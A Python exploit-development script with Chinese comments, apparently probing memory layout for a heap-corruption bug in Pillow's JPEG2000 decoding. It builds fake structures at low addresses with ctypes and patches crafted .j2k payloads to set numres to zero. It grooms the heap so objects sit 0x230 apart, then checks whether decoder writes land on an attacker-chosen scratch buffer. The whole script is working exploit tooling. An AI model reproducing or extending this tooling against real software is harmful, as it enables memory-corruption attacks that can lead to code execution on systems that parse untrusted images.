#!/usr/bin/env python3
# 量布局：用 num_resolutions=1 的自定义 payload => tiles[] 是否回到 array+0x230
import ctypes, gc, io, os, re, subprocess, sys
from PIL import Image

HOLD = []


def low_buffer(n):
    for _ in range(64):
        b = bytearray(n)
        v = (ctypes.c_char * n).from_buffer(b)
        HOLD.append((b, v))
        a = ctypes.addressof(v)
        if a < 0x1000000:
            return b, a
    raise RuntimeError('no low buffer')


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def put32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


SCR_O, SCRATCH = low_buffer(8192)
RES_O, RESADDR = low_buffer(4096)
FAKE_O, FAKE = low_buffer(4096)
print("[*] SCRATCH=%#x RES=%#x FAKE=%#x" % (SCRATCH, RESADDR, FAKE))

put64(FAKE + 0x10, 1)          # compno=0, numresolutions=1
put64(FAKE + 0x18, 1)
put64(FAKE + 0x20, RESADDR)
put64(FAKE + 0x28, 40)
put64(FAKE + 0x30, SCRATCH)    # ★ data -> scratch
put64(FAKE + 0x38, 0)
put64(FAKE + 0x40, 4096)
put64(FAKE + 0x48, 4096)
put64(FAKE + 0x70, 256)
put32(RESADDR + 0x08, 16)
put32(RESADDR + 0x0c, 16)
put32(RESADDR + 0x10, 1)
put32(RESADDR + 0x14, 1)

A = FAKE - 0x0c

# 不同 num_resolutions 的 payload，各测一次布局
for NR in (1, 0):
    pay = '/tmp/nr%d.j2k' % NR
    kw = dict(tile_size=(8, 8), num_resolutions=NR) if NR >= 1 else dict(tile_size=(8, 8))
    code = ("from PIL import Image\n"
            "im = Image.new('L', (16,16))\n"
            "im.putdata([0x9c] + [0]*255)\n"
            "im.save(%r,'JPEG2000', **%r)\n" % (pay, kw))
    r = subprocess.run([sys.executable, '-c', code], capture_output=True, text=True)
    if r.returncode != 0:
        print("NR=%d 编码失败 %s" % (NR, (r.stderr or '')[:60])); continue
    # 如果是 NR=0 的替代：补丁成 numres=0
    if NR == 0:
        import struct
        d = bytearray(open(pay, 'rb').read())
        i = d.find(b'\xff\x52')
        d[i + 4 + 5] = 0x00
        j = d.find(b'\xff\x5c')
        Lq = struct.unpack('>H', d[j + 2:j + 4])[0]
        d[j:j + 2 + Lq] = b'\xff\x5c' + struct.pack('>H', 4) + b'\x40\x40'
        open(pay, 'wb').write(bytes(d))

    out = subprocess.run(['python3', '/tmp/mk13.py', pay, '/tmp/mm.j2k', '0', '23',
                          hex(A), hex(A + 0x1000), hex(A + 0x4000), '-370'],
                         capture_output=True, text=True).stdout
    if 'OK' not in out:
        print("NR=%d build 失败 %s" % (NR, out[:50])); continue

    LOG = '/tmp/lay%d.log' % NR
    pid = os.fork()
    if pid == 0:
        fd = os.open(LOG, os.O_WRONLY | os.O_CREAT | os.O_TRUNC)
        os.dup2(fd, 2)
        gc.collect()
        prime = [bytes(519) for _ in range(1024)]
        del prime
        pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
        good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
        keep = [t for i, t in enumerate(good) if i != len(good) // 2]
        Ks = [B for (D, B) in keep]
        holeD = good[len(good) // 2][0]
        del holeD, pairs, good
        gc.collect()
        try:
            M = open('/tmp/mm.j2k', 'rb').read()
            im = Image.open(io.BytesIO(M)); im.load()
            os.write(1, ("OK %s\n" % (im.size,)).encode())
        except BaseException as e:
            os.write(1, ("ERR %r\n" % (e,)).encode())
        os._exit(0)
    os.waitpid(pid, 0)
    log = open(LOG, errors='ignore').read()
    arr = tiles = None
    for ln in log.splitlines():
        m = re.search(r'tp_index=(0x[0-9a-f]+)', ln)
        if m and arr is None:
            arr = int(m.group(1), 16)
        m = re.search(r'DBG MAP\] tile=(0x[0-9a-f]+)', ln)
        if m and tiles is None:
            tiles = int(m.group(1), 16)
    res = ("OK" if "OK " in log else "ERR")
    d = (tiles - arr) if (arr and tiles) else None
    print("NR=%d: 解码=%s  tp_index=%s tiles=%s  delta=%s %s"
          % (NR, res, hex(arr) if arr else '?', hex(tiles) if tiles else '?',
             hex(d) if d is not None else '?',
             "★=0x230!" if d == 0x230 else ""))

    # 顺便看 scratch 是否被写（写入是否落到我们指定的地址）
    same = sum(1 for i in range(8192) if SCRATCH and ctypes.string_at(SCRATCH + i, 1) == b'\x00')
    print("     scratch 首 16 字节:", ctypes.string_at(SCRATCH, 16).hex())